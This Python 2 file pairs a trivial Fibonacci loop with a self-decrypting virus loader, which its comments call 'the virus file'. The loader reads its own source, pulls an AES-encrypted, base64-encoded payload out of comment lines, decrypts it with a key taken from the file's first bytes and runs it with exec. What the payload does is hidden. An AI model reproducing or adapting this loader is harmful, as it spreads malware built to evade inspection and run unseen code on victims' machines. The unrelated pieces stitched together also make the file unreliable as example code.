parents, babies = (1, 1)
while babies < 100:
    print 'This generation has {0} babies'.format(babies)
    parents, babies = (babies, parents + babies)

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#+wCeGUUAXGnPRkdxHncQuDH4Zmu/rMv6tgk3D55q2M5gkXCR/I1mDJCgBV/xrGuJ9PeySiDs7bRY2zJfmv53IjDSBc/E/27NAe3fWKJo57DIp9oL7VffrdYZ6tL81MfmCYn9oErOvECon0Lr8mg7beyy1mr4c9/YF9vwtI4JMGCAoQ3aAIF4O6SW8OyoawQk0TQisYpp/ThzLvbatL9Pqdro/y1kjlmW3phzI5u0Jz9mhxgFWAYLlaUwU7WvlIK5eQquhQy7SjuBZuAKJG4+JLT5mgN3TKZfo+Mn5agTD/PODoVWEcraCeE8tsYjqnblckQ6on7+4fXKNhXpFvVE94RQkZJi276WnLz2CKX/6n5XdCPRjFm5JfRVbYIUs1B02qgGJVyVtz+KK/CL6O5e6sTCOSqcbMlNo3wM4RTIEjgocCw51H4HHYKfAwxsDNNqwKhsSIO/BZMty7q9jpgUtTjkBem32jLqr/vcZ8ovmk1X+U3dFwcRnfC1pA0cCevmmUXph4Xb9BsIcBpF9j3TTFEMABYGpIwKac/A1ZKei0OtEq5D3FBGuw9EshNjQCSBw6iRkGZQuY2jBdTR+NAH0xx8tYu2ZVVYo4LNX70l3CuIaU+5u50z9xXY05nXcNXo0F3LZ1S2e9TOs6NSq0bnb2VWLJnzKUdaziDHvYdm5cQqTXsG4nEaI8SibGDenSGcs1bs2NcL3/0+Fbg6YMbbti26UBlLLIrS2JjcTWCHrEO4UW0N6d1h6zO0PKcA0McUoUxoiUbxZIlA4EZGE6FQ5cdr+YeJZChQJZBzzwzW3WxfEkfxTGDwFQD/Z5JWbgtxFsJA2yvLoknZTqvc1hweQypkThuYuR3qVo6FFajQ806bHF99Xr68jzYTquj4RCUN6jR2oclmFI85Ed62+zECCaVKZS/rHSLZKG2+UCgmxLwziEtdFR9lrgxgyniBqyGkFX2GjkJnv7lMwhWtK7ulqcXorVniA7Rn3IUc6Hcwb1gTH4QE313xUpSCP0godV02k9XScDqwqAFH6qcJahNwDVT4OGp5gHw6qPdVVkGGg6PVZo6FkDiqd6pD+Pev1lSjjq5fp3YOqIGWuEMdEW3VMAbvPShXfuB1xqDdrR+kL3AckK73d28MOM4LDDVOSTHKFB992mZthh/OzDy0f1eA9A8tpOi5rDI2CPYmG83u3q6LZGjCBaJVTnUkwFHGlNV6JHDL703KsIHTUq8ZgB/ej955ldRlZ9ZkiwXkG3xBsyGy6FR/0ToIMdqRvnWqfp9I0YyYe0e3JUylGJFBKowNdskzDnkxP8v2RcqzArolEvjm70dljhaOrTT6P+RrTsTyQDsLl40Z23TSEX7P+jJ0HObIyyk9YqgwsXr80awNhYtVHgHL1e4hYaE+QN2yp2F2GfJxImJIJqTUvtzS6ceLY59cv0qXqhfffjuURW5716jcCk3lvAIBCPBl6FJf4bkBo/mkDWiNTh5L8Lce9Ixy0mPYpirkoW629ZGDb07X2mtTdCU+b9qSWK6UCNlRa3pzPjGhppNi2nH8HyLgTNyKoYpkTrDmbPXZDEF/gklFkJKeYMh2wcxFReOJVcz58hhAthr3fv1mCxmF0gSIvrFzgH5wPSwHdBl+ow6EjzAnUH+PELKsz/Kvc2Yl3lR1G66LOiroScUrBnzKavkXP5U7pd0Ka7hQT4hqbAFcUoToHG141mQ+ayoeDTOe84MbfJ8+8dJNsBdA1JNV4f4Ox3H8oHb7nWwJPEitGpRZpiAjXE+LQM1y21DBDV9/fUklbXzLUoQvmK4z7PxDXxKIa/FyB7CRjYHKQlPexb5lyHHStJZPLPorbAANjU6jKdAMV2/g5CRflRpi3um+wkEiCYa2SGta47rspAw1Bp9Ydzs4mWwB9A1ZvZacOtCcoEGsf3PzW3/zDqLU8tZHKNQE/RL2KK/kDel31j4sa9wfprIjXCQ4+VR1A/UmJvO0DczuHsOG5GYKj15gS+dghJM9CPjb9Ixzq2DFdFjw/T0lc9NPq5RBCW606z60wtmM3vAHRhfQI+5cFMxJ5wWz4dp/hQB7HeCr4kbjUbPdIHdcOkQl1G3OG4Fcs25+DGga3BMtcIjvpj0I6uOeJfDQWIZhm91eEiptwgfbV3eVc17nsBVsMErJPBs6ImGPO8m1KaTZghVgGzZ7FkeU8uBjIo/sxd/hPVfFKirv8/Uz8rLsbpPtV9XSzf1YRom0MHBThd/hZmIpgwVS5LygxpcfhT3u6TY0RfVhHkAXCKOs9WxGhZ74V0c3L0/TDQcS0CgrwIP8h0BkdmL+h1LLmvfKzV5DmGzkV8L6TyTxyWz9wsnShuc01wfB3/vrmJ9quW7CltVjGtqAaeV0ShyP/n/W6KSTpRn14z28RIYqqHJ9bb0xJ1NYXK+TLR0SLbGAJfXEjjDQzG9P306p8w6LUgBHUQpjTXkoQXBA3A4J4fqLEQk5D0MdFPkiL5NeKYq7599Pm9K+nMdwClxm4JUa7w+KeQqMrhUKcxqkag96cewDLRJqqsBsSXO6up1igJ3DhK7tSYaxIflDq+krE/SSZ3q/ZIq3JMXMajv+SE3vF3kfcE726GbwjJBdu46UUaogpTSICQM1dWwpvvK2hrfXfYuw2NbS1zOLFGVjbJPp6DeSL1gjchjKsG0nJeCZcBG+zqjMoPvupVIRHPdZlc1/FK1cdmT9P/rU4klGgoKrICQF8tJUFB61aYzvRX+gnOKu3yNxTmT14LdEbU1eWccwTCsGWWHsagNV+Ns0aTFabu2JGgF2r7V6K+4HEyH2xxOo
# End payload